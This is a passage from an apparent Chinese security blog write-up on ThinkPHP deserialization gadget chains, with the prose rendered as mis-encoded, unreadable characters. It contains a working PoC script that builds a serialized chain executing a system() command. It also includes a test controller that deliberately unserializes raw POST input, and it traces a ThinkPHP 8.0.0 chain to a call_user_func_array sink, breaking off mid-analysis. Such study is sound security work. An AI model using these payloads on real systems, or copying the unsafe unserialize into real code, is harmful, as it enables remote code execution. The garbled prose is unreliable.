</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$b</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">app</span><span class="o">=</span><span class="nv">$b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">config</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;force_client_ids&#39;</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;allow_client_ids&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;debug&#39;</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;format_head&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="k">new</span> <span class="nx">\think\view\driver\Php</span><span class="p">,</span><span class="s1">&#39;display&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Request</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$url</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">url</span><span class="o">=</span><span class="s2">&#34;&lt;?php system(&#39;calc&#39;); ?&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">App</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$instances</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">instances</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;think\Request&#39;</span> <span class="o">=&gt;</span> <span class="k">new</span> <span class="nx">Request</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$d</span><span class="o">=</span><span class="k">new</span> <span class="nx">App</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="k">new</span> <span class="nx">\think\log\driver\Socket</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">\think\log\Channel</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">=</span><span class="k">new</span> <span class="nx">\League\Flysystem\Cached\Storage\Psr6Cache</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$c</span><span class="p">)));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂÖ∂ÂÆûÂü∫Êú¨ÈìæÂ≠êÁü•ÈÅì‰∫ÜÔºåÂ∞±ÂèØ‰ª•Áõ¥Êé•ÊûÑÈÄ†Â•ΩÁ±ªÔºåÁÑ∂ÂêéÁîüÊàêÂ∫èÂàóÂåñÊï∞ÊçÆÔºåÂ¶ÇÊûúËøòÊòØÊúâÈóÆÈ¢òÔºåÂú®Ë∞ÉËØïÊó∂ÂÜç‰∏ÄÊ≠•‰∏ÄÊ≠•‰øÆÊîπ„ÄÇ</p>
<p>ÊúÄÂêéÊòØÊàêÂäüÂºπÂá∫ËÆ°ÁÆóÊú∫ÁöÑÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061348641.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306134856346"
	
	
></p>
<p>‰ªéÈ°µÈù¢ÊòæÁ§∫ÊòØÁü•ÈÅìÊúâÂõûÊòæÁöÑ„ÄÇÊâÄ‰ª•ÂèØ‰ª•Áõ¥Êé•ÊâìÊúâÂõûÊòæÁöÑÂëΩ‰ª§ÊâßË°å„ÄÇ</p>
<h4 id="ÈóÆÈ¢òËß£ÂÜ≥">ÈóÆÈ¢òËß£ÂÜ≥
</h4><p>ÂâçÈù¢Áïô‰∫Ü‰∏Ä‰∏™ÈóÆÈ¢òÔºå‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πà‰ºöÈÄâÊã©Psr6CacheÁ±ªÁöÑsave()ÊñπÊ≥ï„ÄÇÂÖ∂ÂÆû‰ªéÊï¥‰∏™ÊûÑÈÄ†ËøáÁ®ã‰∏ãÊù•ÁúãÔºåÂ∞±Âü∫Êú¨‰∏äÂ∑≤ÁªèÊáÇ‰∫Ü„ÄÇÈ¶ñÂÖàÔºåÈÄâÁî®Psr6CacheÁ±ªÊòØÂÆåÁæéÁ¨¶ÂêàÈìæÂ≠êÁöÑÔºåÂÖ∂Ê¨°ÔºåÂú®javaÁöÑÂ≠¶‰π†‰∏≠ÔºåÊàë‰ª¨ÂèØ‰ª•Áü•ÈÅìÂú®ÂèçÂ∫èÂàóÂåñ‰∏Ä‰∏™Á±ªÊó∂ÔºåÂêåÊó∂Ëøò‰ºöÂèçÂ∫èÂàóÂåñÂÆÉÁöÑÁà∂Á±ªÔºåËøôÊ†∑Â∞±‰ºöËß¶ÂèëAbstractCacheÁ±ªÁöÑ<code>__destrcut()</code>ÊñπÊ≥ïÔºå‰ªéËÄå‰ΩøÂæóÈìæÂ≠êÊâßË°å„ÄÇ</p>
<p>ËÄåÈ°µÈù¢ÂõûÊòæÁöÑhttp://ÔºåÂÖ∂ÂÆûÂ∞±ÊòØÈìæÂ≠ê‰∏≠ÊãºÊé•urlÂêéÁöÑÁªìÊûúÔºå‰ΩÜÊòØphp‰ª£Á†ÅË¢´ÊâßË°å‰∫ÜÔºåÊâÄ‰ª•Âè™ÊúâËøô‰∏™ÂõûÊòæÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061357025.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306135741969"
	
	
></p>
<p>‚Äî‚Äî‚Äî‚Äî</p>
<h4 id="ÊÄªÁªì-1">ÊÄªÁªì
</h4><p>‰ªéËøô‰∏™ÈìæÂ≠ê‰∏≠ÔºåÂ≠¶Âà∞‰∫ÜÂæàÂ§öÔºåÂÖ≥ÈîÆ‰ª£Á†ÅÁöÑÊäìÂèñ„ÄÅÂÖ≥ÈîÆÁ±ªÁöÑÈÄâÂèñ„ÄÇ„ÄÇ„ÄÇ</p>
<p>ÊÑüËßâÊåñ‰∏ÄÊù°ÈìæÂ≠êÁúüÁöÑÊòØË¶ÅÁúãÂæàÂ§ö‰ª£Á†ÅÂëÄÔºåÂáΩÊï∞Ë∞ÉÁî®ÂΩìÁÑ∂‰∏çÈöæÔºå‰ΩÜÊòØË¶ÅÊâæÂà∞ÂØπÂ∫îÁöÑÂáΩÊï∞ÔºåËøòÊòØÊØîËæÉËä±ËÄêÂøÉÁöÑÔºåinterstingÔºåÊüê‰∏§‰∏™ÊñπÊ≥ïÈÖçÂêàËµ∑Êù•Â∞±ËÉΩÊâìÊàê‰∏ÄÊù°ÈìæÂ≠ê„ÄÇ</p>
<p>ÂêåÊó∂Âú®ËøôÈáåÁü•ÈÅìÔºåÂØπ‰∫é‰∏Ä‰∫õÊ°ÜÊû∂ÔºåÊúâ‰∫õÊºèÊ¥ûÁÇπÁúüÂèØ‰ª•Âéªgithub issue‰∏äÁúãÔºåÊàëÁúãËøôÊù°ÈìæÂ≠êÁöÑPOCÂ∞±ÊòØÂú®github issue‰∏äÂèØ‰ª•ÁúãÂà∞ÁöÑÔºåÂèØ‰ª•ÁúãÂèÇËÄÉÊñáÁ´†„ÄÇ</p>
<p>ÂèÇËÄÉÊñáÁ´†Ôºö</p>
<p><a class="link" href="https://github.com/top-think/framework/issues/2749"  target="_blank" rel="noopener"
    >https://github.com/top-think/framework/issues/2749</a></p>
<p><a class="link" href="https://xz.aliyun.com/news/11615?time__1311=eqUxuQDtDQitqAKD%3DD%2FFn%2BCBKqGQqD9QnGoD&amp;u_atoken=d85375bd9b5b083adb46a87b18f126c7&amp;u_asig=1a0c399a17410911216675510e012d"  target="_blank" rel="noopener"
    >https://xz.aliyun.com/news/11615?time__1311=eqUxuQDtDQitqAKD%3DD%2FFn%2BCBKqGQqD9QnGoD&u_atoken=d85375bd9b5b083adb46a87b18f126c7&u_asig=1a0c399a17410911216675510e012d</a></p>
<p><a class="link" href="https://blog.csdn.net/qq_29920751/article/details/87630803"  target="_blank" rel="noopener"
    >https://blog.csdn.net/qq_29920751/article/details/87630803</a></p>
<p><a class="link" href="https://blog.csdn.net/qq_21296205/article/details/128369757"  target="_blank" rel="noopener"
    >https://blog.csdn.net/qq_21296205/article/details/128369757</a></p>
<p>‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî</p>
<h3 id="thinkphpv800-ÂèçÂ∫èÂàóÂåñÊºèÊ¥û">Thinkphpv8.0.0 ÂèçÂ∫èÂàóÂåñÊºèÊ¥û
</h3><p>ÈúÄË¶Å‰ΩøÁî®php8ÔºåÊàëËøôÈáåÊòØphp8.2.9+thinkphp v8.0.0</p>
<p>Ëøô‰∏™ÊòØniviaÂ≠¶ÈïøÂú®2024xctf finalÂá∫ÁöÑÈ¢òÔºåÂΩìÊó∂‰ªñÊòØÊåñÂá∫Êù•ÁöÑ0dayÔºåËøôÈáå‰πüÊòØÊù•Â§çÁé∞‰∏Ä‰∏ã„ÄÇ</p>
<p>‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî</p>
<h4 id="ÁéØÂ¢ÉÊê≠Âª∫-2">ÁéØÂ¢ÉÊê≠Âª∫
</h4><p>ÁéØÂ¢ÉÊê≠Âª∫‰∏Ä‰∏™php8ÁöÑÁéØÂ¢ÉÔºåÂèÇËÄÉ‰πãÂâçÂèëÁöÑÊê≠Âª∫ÁöÑphp7ÁöÑË∞ÉËØïÁéØÂ¢ÉÊïôÁ®ãÔºåÂ∑Æ‰∏çÂ§öÁöÑ„ÄÇ</p>
<p>ÁÑ∂Âêé‰∏ãËΩΩÊ∫êÁ†ÅÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">composer create-project topthink/think=8.0.0 think-8.0.0
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êîπcomposer.jsonÊñá‰ª∂ÁöÑÊ°ÜÊû∂ÁâàÊú¨‰∏∫ÊåáÂÆöÁâàÊú¨<code>8.0.0</code>ÔºåÁÑ∂ÂêéËøêË°å<code>composer update</code>Êõ¥Êñ∞‰∏Ä‰∏ãÂç≥ÂèØ„ÄÇ</p>
<p>ÊúÄÂêéËÆøÈóÆÊàêÂäüÊê≠Âª∫Ôºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061538764.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306153801695"
	
	
></p>
<p>ËøôÈáåËøòÊòØÂú®app/controller/IndexÈ°µÈù¢Âä†‰∏Ä‰∏™ÂÖ•Âè£Âç≥ÂèØÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">app\controller</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nx">app\BaseController</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Index</span> <span class="k">extends</span> <span class="nx">BaseController</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">index</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;&lt;style&gt;*{ padding: 0; margin: 0; }&lt;/style&gt;&lt;iframe src=&#34;https://www.thinkphp.cn/welcome?version=&#39;</span> <span class="o">.</span> <span class="nx">\think\facade\App</span><span class="o">::</span><span class="na">version</span><span class="p">()</span> <span class="o">.</span> <span class="s1">&#39;&#34; width=&#34;100%&#34; height=&#34;100%&#34; frameborder=&#34;0&#34; scrolling=&#34;auto&#34;&gt;&lt;/iframe&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">hello</span><span class="p">(</span><span class="nv">$name</span> <span class="o">=</span> <span class="s1">&#39;ThinkPHP8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;hello,&#39;</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéÂ∞±ÂèØ‰ª•ÂºÄÂßãÊÑâÂø´ÁöÑ‰ª£Á†ÅÂÆ°ËÆ°‰∫Ü„ÄÇ</p>
<p>psÔºöÂ•ΩÂÉèËøôÊù°ÈìæÂ≠êÂêéÂçäÈÉ®ÂàÜÂíå‰∏Ä‰∏™thinkphp6ÁöÑÂæàÂÉèÔºåÂíåÊàëÂâçÈù¢ÂÆ°ÁöÑ‰∏ç‰∏ÄÊ†∑ÔºåÁõ¥Êé•‰ªéËøôÈáåÂ≠¶‰∫ÜÔºå‰∏çÂÜçËøîÂõûÂéªÂÆ°ËÆ°ÈÇ£‰∏™‰∫Ü„ÄÇ</p>
<p>‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî</p>
<h4 id="‰ª£Á†ÅÂÆ°ËÆ°-1">‰ª£Á†ÅÂÆ°ËÆ°
</h4><p>Âú®‰∏ÄÁØáÊñáÁ´†‰∏≠ÁúãÂà∞‰∫Ü‰∏Ä‰∏™ÁÇπÔºå‰ª£Á†ÅÂÆ°ËÆ°Ë¶ÅÈÄâÂ•ΩsinkÁÇπÂíåsourceÁÇπÔºåÁÑ∂ÂêéÂú®ÊåñÈìæÂ≠êÁöÑËøáÁ®ã‰∏≠ÂéªÈù†Âç≥ÂèØÔºåÊÑüËßâËøòÊòØÊØîËæÉÊúâÊÑèÊÄùÁöÑ„ÄÇ</p>
<p>‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî</p>
<h5 id="sourceÁÇπÈÄâÊã©">sourceÁÇπÈÄâÊã©
</h5><p>‰∏ÄËà¨ÁöÑsourceÁÇπÂ∞±ÊòØ<code>__destruct</code>ÊàñËÄÖ<code>__wakeup</code>ÊñπÊ≥ïÔºåÁõ¥Êé•ÂÖ®Â±ÄÊêúÁ¥¢<code>__destruct</code>ÊñπÊ≥ïÔºåÊâæÂà∞‰∏§‰∏™ÂèØ‰ª•‰ΩøÁî®ÁöÑÁÇπÔºö</p>
<p>League\Flysystem\Cached\Storage\AbstractCacheÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">autosave</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">save</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>think\route\ResourceRegisterÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">registered</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">register</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Âú®ËøôÈáåÈÄâÊã©ÁöÑÊòØÁ¨¨‰∫å‰∏™„ÄÇ</p>
<h5 id="sinkÁÇπÈÄâÊã©">sinkÁÇπÈÄâÊã©
</h5><p><strong>‰∏ÄËà¨Ê°ÜÊû∂ÁöÑÂèçÂ∫èÂàóÂåñsinkÁÇπÈÉΩ‰ºöÈÄâÊã©callÊñπÊ≥ïÔºåÂõ†‰∏∫‰∏ÄËà¨ÂèØËÉΩÁöÑÂç±Èô©Êìç‰ΩúÈÉΩÂú®callÊñπÊ≥ï‰∏ä</strong>„ÄÇ</p>
<p>Âú®ËøôÈáå‰ΩøÁî®ÁöÑÊòØthink\Validate#__callÔºå‰ª£Á†ÅÈÄªËæëÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="nv">$args</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="s1">&#39;is&#39;</span> <span class="o">==</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">)))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$method</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">array_push</span><span class="p">(</span><span class="nv">$args</span><span class="p">,</span> <span class="nx">lcfirst</span><span class="p">(</span><span class="nv">$method</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">call_user_func_array</span><span class="p">([</span><span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;is&#39;</span><span class="p">],</span> <span class="nv">$args</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ëøô‰∏™‰ª£Á†ÅÈÄªËæëÔºåÂ¶ÇÊûúÊÉ≥Ë¶ÅËÉΩÂ§üËøõÂÖ•ifËØ≠Âè•ÔºåÈúÄË¶Å<code>$method</code>Âêç‰∏∫Á±ª‰ººisevalËøôÁßçÔºåÁÑ∂ÂêéÂ∞±‰ºöÊà™ÂèñÔºåÂ∞Ü<code>$method</code>ÁöÑÂÄºÊõ¥Êñ∞‰∏∫evalËøôÁßçÔºåÊúÄÂêéÂ∞±Ë∞ÉÁî®‰∫Ücall_user_func_array()ÊñπÊ≥ïÔºåËøô‰∏™ÂáΩÊï∞ÁöÑË∞ÉÁî®‰πüÊòØÈùûÂ∏∏ÊúâÊÑèÊÄùÔºåÁªô‰∏Ä‰∏™‰ª£Á†ÅËØ¥ËØ¥ËøôÈáåÁöÑÈÄªËæëÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Foo</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">bar</span><span class="p">(</span><span class="nv">$arg</span><span class="p">,</span> <span class="nv">$arg2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="no">__METHOD__</span><span class="p">,</span> <span class="s2">&#34; got </span><span class="si">$arg</span><span class="s2"> and </span><span class="si">$arg2\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$foo</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Foo</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">call_user_func_array</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="nv">$foo</span><span class="p">,</span> <span class="s2">&#34;bar&#34;</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;three&#34;</span><span class="p">,</span> <span class="s2">&#34;four&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="c1">//output:  Foo::bar got three and four
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÂèØ‰ª•Áü•ÈÅìÔºåËøôÈáåÂ∞±ÊòØË∞ÉÁî®<code>$foo</code>ÂÆû‰æãÁöÑbar()ÂáΩÊï∞ÔºåÈÇ£‰πàÂêåÊ†∑ÁöÑÔºåÂú®ÂéüÊù•ÁöÑpayload‰∏äÔºåËøôÈáåÂ∞±ÊòØË∞ÉÁî®<code>$this</code>ÁöÑis()ÂáΩÊï∞ÔºåÂÖ®Â±ÄÊêúÁ¥¢isÂáΩÊï∞ÔºåÂæóÂà∞‰∫ÜÂ¶Ç‰∏ãÂáΩÊï∞Ôºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061633633.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306163321534"
	
	
></p>
<p>ÂêåÊ†∑ËøòÊòØthink/ValidateÁ±ªÁöÑis()ÂáΩÊï∞Ôºå‰ªéÂõæ‰∏≠ÂèØ‰ª•ÁúãÂà∞ÊúÄÂêéËøôÈáåÁöÑÂèÇÊï∞ÈÉΩÊòØÂèØÊéßÁöÑÔºåÂèØ‰ª•ËææÂà∞Ë∞ÉÁî®ÂõûË∞ÉÂáΩÊï∞Êù•ËææÂà∞ÂëΩ‰ª§Ê≥®ÂÖ•ÁöÑÊïàÊûú„ÄÇ</p>
<p>Áé∞Âú®sinkÁÇπÂíåsourceÁÇπÈÉΩÊâæÂà∞‰∫ÜÔºåÊù•Áúã‰∏Ä‰∏ã‰∏≠Èó¥ÁöÑÈìæÂ≠ê„ÄÇ</p>
<h5 id="ÈìæÂ≠êÂØªÊâæ">ÈìæÂ≠êÂØªÊâæ
</h5><p>ÂÖ•Âè£ÁÇπÊòØ think\route\ResourceRegisterÁ±ªÁöÑ<code>__destruct</code>ÂáΩÊï∞Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">registered</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">register</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>$this-&gt;registered</code>ÂèòÈáèÂèØÊéßÔºåÁÑ∂ÂêéÂõûË∞ÉÁî®Âà∞register()ÊñπÊ≥ïÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">protected</span> <span class="k">function</span> <span class="nf">register</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">registered</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">resource</span><span class="o">-&gt;</span><span class="na">parseGroupRule</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">resource</span><span class="o">-&gt;</span><span class="na">getRule</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
